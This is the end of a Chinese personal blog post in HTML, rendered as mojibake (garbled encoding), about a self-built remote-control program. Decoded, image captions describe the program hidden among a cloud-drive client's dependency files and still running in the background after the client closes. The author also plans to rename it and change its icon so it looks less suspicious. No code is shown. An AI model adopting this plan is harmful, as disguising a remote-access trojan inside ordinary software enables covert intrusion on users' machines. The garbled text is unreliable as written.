</span></span></code></pre></div><p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘å°è¯•äº†å¾ˆå¤šçš„åŠæ³•ï¼Œéƒ½ä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼šåœ¨Pycharmä¸‹è¿è¡Œæ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯æ‰“åŒ…åè¿è¡Œexeç¨‹åºï¼Œæ•´ä¸ªç”µè„‘ç›´æ¥å¡æ­»ï¼Œå†…å­˜çˆ†æ»¡ï¼Œæœ€åç›´æ¥é‡å¯ã€‚</p>
<p>è§£å†³åŠæ³•å°±æ˜¯<a href="https://blog.csdn.net/Owen_goodman/article/details/115521388">ä½¿ç”¨multiprocessing.freeze_support()</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201225942.png" alt="æ‰“åŒ…ä¹‹åæ–‡ä»¶ç»“æ„">
<img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201230034.png" alt="éšè—åœ¨ä¾èµ–æ–‡ä»¶ä¸­çš„è¿œæ§ç¨‹åº">
<img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201230240.png" alt="å…³é—­äº‘ç›˜å®¢æˆ·ç«¯åä¾æ—§åœ¨åå°è¿è¡Œçš„è¿œæ§ç¨‹åº"></p>
<p>ä¸è¿‡åç»­è¿˜æ˜¯éœ€è¦å°†è¿™ä¸ªè¿œæ§ç¨‹åºå›¾æ ‡å’Œåç§°æ”¹çš„æ›´åŠ åˆé€‚ä¸€ç‚¹ï¼Œæ¯•ç«ŸdllåŠ¨æ€é“¾æ¥åº“æ€ä¹ˆå¯èƒ½åœ¨åå°è¿è¡Œ</p>
<h2 id="æ€»ç»“">æ€»ç»“</h2>
<p>æ•´ä¸ªé¡¹ç›®æˆ–è€…è¯´æ˜¯ç¨‹åºï¼Œæ€»ä½“ä¸Šæ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰ä»€ä¹ˆå¾ˆéš¾çš„ç‚¹ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ç”¨åˆ°æœ€å¤šçš„å°±æ˜¯<strong class=chinese>è®¡ç®—æœºç½‘ç»œ</strong>å’Œ<strong class=chinese>ç½‘ç»œç¼–ç¨‹</strong>ä¸­çš„çŸ¥è¯†ç‚¹ï¼Œäºæ­¤åŒæ—¶ï¼Œæœ€åéƒ¨åˆ†ä¹Ÿæ¶‰åŠåˆ°äº†Python<strong class=chinese>å¼‚æ­¥ç¼–ç¨‹</strong>ï¼Œ<strong class=chinese>å¤šçº¿ç¨‹</strong>ï¼Œ<strong class=chinese>å¤šè¿›ç¨‹</strong>ä»¥åŠ<strong class=chinese>åç¨‹</strong>çš„æ¦‚å¿µï¼Œå®Œæˆè¿™ä¸ªç¨‹åºä¹Ÿç®—æ˜¯å·©å›ºå’Œè¡¥å……äº†è¿™äº›æ–¹é¢çš„çŸ¥è¯†ï¼Œå¼¥è¡¥äº†ä¸€äº›ä¸æ‡‚çš„åœ°æ–¹ï¼Œç°åœ¨å†™ä¸‹æ¥ä¹Ÿç®—æ˜¯å›é¡¾æ€»ç»“å­¦åˆ°çš„çŸ¥è¯†ç‚¹ã€‚</p>
    
  </article>
  <div class="paginator">
    
    <a class="link" href="https://blog.pi3.fun/post/2023/11/netcat%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">â† prev</a>
    
    
    <a class="link" href="https://blog.pi3.fun/post/2023/12/%E5%9F%BA%E4%BA%8Eudp%E7%9A%84%E5%A4%9A%E4%BA%BA%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9%E5%AE%A4/">next â†’</a>
    
  </div>
  <div class="comment">
    
    
    
    
      <script src="https://giscus.app/client.js"
        data-repo="Pi3-l22/Pi3-notes-giscus"
        data-repo-id="R_kgDOM4Xgbg"
        data-category="Announcements"
        data-category-id="DIC_kwDOM4Xgbs4Ci3nv"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="light_protanopia"
        data-lang="zh-CN"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>

    
    
    
  </div>
  
</main>

    <footer id="footer">
  <div>
    <span>Â© 2021</span> - <span>2024</span>
    <span> ğŸ¦ By LiuChao</span>
  </div>

  

  <div class="footnote">
    <span>Follow me on <a class=link href=https://github.com/Pi3-l22 Target=_ blank>GitHub</a> | <a class=link href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh target=_blank rel=noopener>CC BY-NC-SA 4.0</a>
</span>
  </div>
</footer>

  </div>

  
  

  
  

  
  
      <script async src="https://www.googletagmanager.com/gtag/js?id=HJOhpNzmDR9KDTM2EPRjdYNcs_N_d427SxrtjmXAIbQ"></script>
      <script>
        var doNotTrack = false;
        if ( false ) {
          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
          var doNotTrack = (dnt == "1" || dnt == "yes");
        }
        if (!doNotTrack) {
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'HJOhpNzmDR9KDTM2EPRjdYNcs_N_d427SxrtjmXAIbQ');
        }
      </script>

</body>

</html>
